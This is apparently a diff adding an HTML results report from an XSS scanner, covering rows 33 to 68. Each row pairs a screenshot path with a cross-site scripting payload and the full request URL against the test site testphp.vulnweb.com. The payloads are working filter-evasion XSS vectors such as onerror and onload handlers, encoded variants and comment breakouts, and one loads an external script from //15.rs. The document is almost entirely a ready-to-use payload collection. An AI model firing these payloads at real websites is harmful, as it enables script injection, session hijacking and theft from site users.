+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>34</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_47_315.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=&amp;#8196;alert&amp;#65279;(31337)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3d%26%238196%3balert%26%2365279%3b(31337)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3d%26%238196%3balert%26%2365279%3b(31337)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>35</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_48_206.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=alert(&#39;XSS&#39;)//</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(%27XSS%27)%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(%27XSS%27)%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>36</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_48_170.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&quot;>>&lt;marquee>&lt;img src=x onerror=confirm(1)>&lt;/marquee>&quot;>&lt;/plaintext\>&lt;/|\>&lt;plaintext/onmouseover=prompt(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%22%3e%3e%3cmarquee%3e%3cimg+src%3dx+onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%22%3e%3e%3cmarquee%3e%3cimg+src%3dx+onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>37</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_49_336.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/anyjunk/onerror=alert(1) src=a></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fanyjunk%2fonerror%3dalert(1)+src%3da%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fanyjunk%2fonerror%3dalert(1)+src%3da%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>38</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_49_550.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(&#39;XSS&#39;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%27XSS%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%27XSS%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>39</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_49_674.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&amp;#34;&amp;#62;&lt;svg>&lt;style>{-o-link-source&amp;colon;&#39;&lt;body/onload=confirm(1)>&#39;</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%26%2334%3b%26%2362%3b%3csvg%3e%3cstyle%3e%7b-o-link-source%26colon%3b%27%3cbody%2fonload%3dconfirm(1)%3e%27&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%26%2334%3b%26%2362%3b%3csvg%3e%3cstyle%3e%7b-o-link-source%26colon%3b%27%3cbody%2fonload%3dconfirm(1)%3e%27&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>40</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_50_79.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/title>&lt;script>alert(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2ftitle%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2ftitle%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>41</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_50_110.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=alert(document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(document.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>42</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_50_283.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;!--&lt;img src=&quot;-->&lt;img src=x onerror=javascript:alert(1)//&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3cimg+src%3d%22--%3e%3cimg+src%3dx+onerror%3djavascript%3aalert(1)%2f%2f%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3cimg+src%3d%22--%3e%3cimg+src%3dx+onerror%3djavascript%3aalert(1)%2f%2f%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>43</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_51_5.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&lt;script>prompt(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>44</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_51_451.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;select autofocus onfocus=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cselect+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cselect+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>45</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_51_701.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/style>&lt;/scRipt>&lt;scRipt>alert(1)&lt;/scRipt></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fstyle%3e%3c%2fscRipt%3e%3cscRipt%3ealert(1)%3c%2fscRipt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fstyle%3e%3c%2fscRipt%3e%3cscRipt%3ealert(1)%3c%2fscRipt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>46</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_52_87.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;xmp>&lt;img title=&quot;&lt;/xmp>&lt;img src onerror=alert(1)>&quot;>&lt;/xmp></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cxmp%3e%3cimg+title%3d%22%3c%2fxmp%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fxmp%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cxmp%3e%3cimg+title%3d%22%3c%2fxmp%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fxmp%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>47</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_52_373.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=prompt(8)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3dprompt(8)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>48</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_52_822.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;video>&lt;source onerror=&quot;javascript:alert(1)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cvideo%3e%3csource+onerror%3d%22javascript%3aalert(1)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cvideo%3e%3csource+onerror%3d%22javascript%3aalert(1)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>49</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_52_879.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;Img Src=On OnError=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cImg+Src%3dOn+OnError%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cImg+Src%3dOn+OnError%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>50</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_53_869.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body onpageshow=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onpageshow%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cbody+onpageshow%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>51</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_54_252.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;audio src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>52</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_54_257.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=alert(1);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dalert(1)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dalert(1)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>53</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_54_277.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=alert(&#39;XSS&#39;);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(%27XSS%27)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3dalert(%27XSS%27)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>54</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_54_410.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;-->&lt;img src=x onerror=prompt(document.domain);>&lt;!--</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27--%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e%3c!--&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27--%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e%3c!--&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>55</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_55_17.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=prompt(document.domain);>.php</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dprompt(document.domain)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dprompt(document.domain)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>56</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_55_153.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>?query=&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3fquery%3d%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3fquery%3d%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>57</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_55_200.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x ONERROR=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+ONERROR%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+ONERROR%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>58</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_55_233.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;]&lt;img src=1 onerror=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%5d%3cimg+src%3d1+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%5d%3cimg+src%3d1+onerror%3dconfirm(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>59</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_56_588.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=&quot;(function(x){this[x+`ert`](1)})`al`&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3d%22(function(x)%7bthis%5bx%2b%60ert%60%5d(1)%7d)%60al%60%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%2fonerror%3d%22(function(x)%7bthis%5bx%2b%60ert%60%5d(1)%7d)%60al%60%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>60</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_56_706.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%E5%98%8D%E5%98%8A%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%25E5%2598%258D%25E5%2598%258A%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%25E5%2598%258D%25E5%2598%258A%2520%22%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>61</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_56_707.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script akdk> prompt(document.domain)&lt;/script akdk></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript+akdk%3e+prompt(document.domain)%3c%2fscript+akdk%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript+akdk%3e+prompt(document.domain)%3c%2fscript+akdk%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>62</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_56_840.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;/Textarea/&lt;/Noscript/&lt;/Pre/&lt;/Xmp>&lt;Svg/Onload=confirm(document.domain)>”&lt;script/src=//15.rs>&lt;/script>&lt;script src=//⑮.₨>&lt;/script> *</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fTextarea%2f%3c%2fNoscript%2f%3c%2fPre%2f%3c%2fXmp%3e%3cSvg%2fOnload%3dconfirm(document.domain)%3e%e2%80%9d%3cscript%2fsrc%3d%2f%2f15.rs%3e%3c%2fscript%3e%3cscript+src%3d%2f%2f%e2%91%ae.%e2%82%a8%3e%3c%2fscript%3e+*&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%2fTextarea%2f%3c%2fNoscript%2f%3c%2fPre%2f%3c%2fXmp%3e%3cSvg%2fOnload%3dconfirm(document.domain)%3e%e2%80%9d%3cscript%2fsrc%3d%2f%2f15.rs%3e%3c%2fscript%3e%3cscript+src%3d%2f%2f%e2%91%ae.%e2%82%a8%3e%3c%2fscript%3e+*&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>63</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_57_156.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%22%27%3E&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2522%2527%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2522%2527%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>64</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_58_306.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>23;%0adocument.body.innerHTML=location.hash;//#&lt;svg/onload=alert(23)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=23%3b%250adocument.body.innerHTML%3dlocation.hash%3b%2f%2f%23%3csvg%2fonload%3dalert(23)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=23%3b%250adocument.body.innerHTML%3dlocation.hash%3b%2f%2f%23%3csvg%2fonload%3dalert(23)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>65</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_58_607.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(document[&#39;domain&#39;]);>.php</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(document%5b%27domain%27%5d)%3b%3e.php&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>66</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_58_628.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>javascript:alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>67</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_58_690.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=eval(&#39;prompt(document.domain)&#39;)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3deval(%27prompt(document.domain)%27)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3deval(%27prompt(document.domain)%27)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>68</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_58_901.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IFRAME SRC=&quot;javascript:javascript:alert(1);&quot;>&lt;/IFRAME></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e%3c%2fIFRAME%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cIFRAME+SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e%3c%2fIFRAME%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
